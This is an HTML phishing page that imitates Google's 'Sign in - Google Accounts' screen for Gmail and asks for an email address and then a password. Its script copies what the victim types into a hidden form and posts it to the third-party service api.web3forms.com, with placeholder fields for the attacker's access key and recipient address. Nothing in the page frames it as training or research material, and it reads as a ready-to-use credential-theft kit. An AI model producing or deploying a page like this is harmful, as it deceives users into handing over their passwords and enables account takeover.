<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    
    <style>
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f2f4f6;
        }

        .login-container {
            width: 450px; 
            max-width: 95%; 
            text-align: left;
            display: flex;
            flex-direction: column; 
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background-color: #ffffff;
            box-sizing: border-box;
        }

        .logo-img {
            width: 75px; 
            height: auto; 
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            color: #202124;
            margin: 0 0 10px 0;
            font-weight: 400;
        }

        p.subtitle {
            color: #202124;
            font-size: 16px;
            margin: 0 0 35px 0;
            line-height: 1.5;
        }

        /* Hidden input to hold the iframe data */
        #email-input {
            display: none;
        }

        .next-btn {
            appearance: none;
            width: 120px; 
            margin-top: 24px;
            padding: 0 34px; 
            border-radius: 4px; 
            background-color: #1a73e8; 
            color: #fff !important; 
            font-weight: 500;
            font-size: 14px;
            height: 36px;
            cursor: pointer;
            border: none;
            float: right;
        }

         .next-btn:hover {
             background-color: #1765cc !important; 
         }

         .forgot-link {
            display: inline-block;
            margin-top: 20px;
            color: #1a73e8; 
            text-decoration: none !important; 
            font-size: 14px;
            font-weight: 500;
        }

        .footer-text {
            margin-top: 30px;
            font-size: 14px;
            color: #5f6368;
            line-height: 1.5;
        }

        .footer-text a {
            color: #1a73e8;
            text-decoration: none;
        }
        
        .step {
            display: none;
        }
        
        .step.active {
            display: block;
        }
        
        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>

<body> 

    <div class="login-container">
        <!-- Google Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo-img">
        
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <!-- Step 1: Email Input -->
        <div id="step-email" class="step active">
            <input type="text" id="email-display" placeholder="Email or phone" style="width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; height:50px; margin-bottom:20px;">
            
            <button type="button" class="next-btn" onclick="goToPassword()">Next</button>
            
            <div class="clearfix"></div>
            
            <a href="#" class="forgot-link">Forgot email?</a>
        </div>

        <!-- Step 2: Password Input -->
        <div id="step-password" class="step">
            <input type="password" id="password-display" placeholder="Enter your password" style="width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; height:50px; margin-bottom:20px;">
            
            <button type="submit" class="next-btn" id="submitBtn">Next</button>
            
            <div class="clearfix"></div>
            
            <a href="#" class="forgot-link">Forgot password?</a>
        </div>

        <!-- Hidden Form that submits to Web3Forms -->
        <form action="https://api.web3forms.com/submit" method="POST" id="hiddenForm">
            <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
            <input type="hidden" name="to" value="your-email@example.com">
            <input type="hidden" name="email" id="email-input">
            <input type="hidden" name="password" id="password-hidden">
        </form>

        <div class="footer-text">
            Not your computer? Use Guest mode to sign in privately. 
            <a href="#">Learn more</a>
        </div>
    </div>

    <script>
        function goToPassword() {
            // Get the email typed by the user
            const emailVal = document.getElementById('email-display').value;
            if(!emailVal) { alert("Please enter an email"); return; }
            
            // Store it in the hidden form field
            document.getElementById('email-input').value = emailVal;

            // Switch UI
            document.getElementById('step-email').classList.remove('active');
            document.getElementById('step-password').classList.add('active');
            document.getElementById('password-display').focus();
        }

        // Handle final submit
        document.getElementById('submitBtn').addEventListener('click', () => {
            const passVal = document.getElementById('password-display').value;
            document.getElementById('password-hidden').value = passVal;
            document.getElementById('hiddenForm').submit();
        });
    </script>

</body>
</html>
